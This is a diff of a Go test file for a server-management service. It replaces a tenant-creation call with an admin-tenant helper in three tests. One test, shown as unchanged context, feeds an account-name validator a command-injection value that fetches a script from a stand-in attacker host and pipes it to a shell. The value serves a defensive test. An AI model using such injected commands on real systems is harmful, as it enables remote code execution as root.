@@ -391,7 +391,7 @@ func TestAServerAccountNameIsRefusedIfItIsNotOne(t *testing.T) {
 	// that runs as root on the server being added. Everything in those scripts
 	// is quoted; this is the other half.
 	h := newHarness(t)
-	acme := h.newTenant("acme")
+	acme := adminTenant(h, "acme")
 
 	for _, name := range []string{
 		"root; curl http://evil.test/s | sh",
@@ -482,7 +482,7 @@ func TestRemovingTheLastControlPlaneIsRefused(t *testing.T) {
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
 			h := newHarness(t)
-			acme := h.newTenant("acme")
+			acme := adminTenant(h, "acme")
 			h.withCluster(fakeCluster{controlPlanes: c.controlPlanes, err: c.err})
 
 			server := store.Server{
@@ -513,7 +513,7 @@ func TestAWorkerIsRemovableWhateverTheClusterSays(t *testing.T) {
 	// and a cluster that cannot be reached is not a reason to keep a dead
 	// worker in the list.
 	h := newHarness(t)
-	acme := h.newTenant("acme")
+	acme := adminTenant(h, "acme")
 	h.withCluster(fakeCluster{err: errors.New("no route to host")})
 
 	server := store.Server{
